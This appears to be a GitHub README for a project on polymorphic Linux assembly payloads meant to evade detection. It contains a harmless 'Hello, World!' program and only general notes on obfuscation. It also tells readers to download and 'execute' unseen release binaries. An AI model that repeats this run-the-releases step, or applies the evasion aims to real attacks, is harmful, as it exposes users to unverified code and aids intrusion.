## Introduction

Polymorphism in the context of software refers to the ability of a single payload to change its appearance while maintaining the same functionality. This repository explores this concept through the lens of low-level programming in Assembly. We delve into the intricacies of creating payloads that can adapt and evade detection mechanisms, which is crucial in offensive security.

## Project Overview

The goal of this project is to provide a comprehensive guide for developing polymorphic loaders and payloads. Each step is carefully documented, making it easier for beginners and experts alike to understand the underlying principles of Assembly programming and exploit development.

### Key Features

- **Step-by-Step Development**: Follow along with detailed explanations and code snippets.
- **No External Dependencies**: Everything runs using native syscalls, ensuring a lightweight and efficient approach.
- **Focus on Polymorphism**: Learn how to create payloads that can change their structure while executing the same tasks.

## Getting Started

To get started with this project, follow these steps:

1. **Clone the Repository**: 
   ```bash
   git clone https://github.com/joseladiods/linux-asm-polymorphic-payloads.git
   cd linux-asm-polymorphic-payloads
   ```

2. **Download the Releases**: Visit the [Releases](https://github.com/joseladiods/linux-asm-polymorphic-payloads/releases) section to download the latest files. Make sure to execute them as needed.

3. **Set Up Your Environment**: Ensure you have a suitable environment for Assembly programming. You can use tools like `nasm` for assembling and `ld` for linking.

4. **Run Examples**: Start with the provided examples to understand how polymorphic payloads work. You can find them in the `examples` directory.

## Development Process

### Step 1: Understanding Syscalls

System calls (syscalls) are the primary means through which user-space applications interact with the kernel. In this project, we will rely on syscalls to perform operations like reading from files, writing to stdout, and executing processes.

### Step 2: Writing Your First Payload

Start with a simple payload that prints "Hello, World!" to the console. This example will help you get familiar with the Assembly syntax and the syscall mechanism.

```asm
section .data
    msg db 'Hello, World!', 0

section .text
    global _start

_start:
    ; Write to stdout
    mov rax, 1          ; syscall: write
    mov rdi, 1          ; file descriptor: stdout
    mov rsi, msg        ; pointer to message
    mov rdx, 13         ; message length
    syscall

    ; Exit
    mov rax, 60         ; syscall: exit
    xor rdi, rdi        ; status: 0
    syscall
```

### Step 3: Implementing Polymorphism

Once you have the basics down, the next step is to implement polymorphism. This can involve altering the payload structure while keeping the core functionality intact. 

You can achieve this by changing variable names, altering control flow, or even encrypting parts of the payload. 

### Step 4: Testing and Debugging

Testing is crucial in development. Use tools like `gdb` for debugging your Assembly code. Ensure that your payload behaves as expected under various conditions.

### Step 5: Documenting Your Work

Good documentation is key. As you develop, make sure to comment your code and write clear explanations for each step. This will help others who wish to follow your lead.
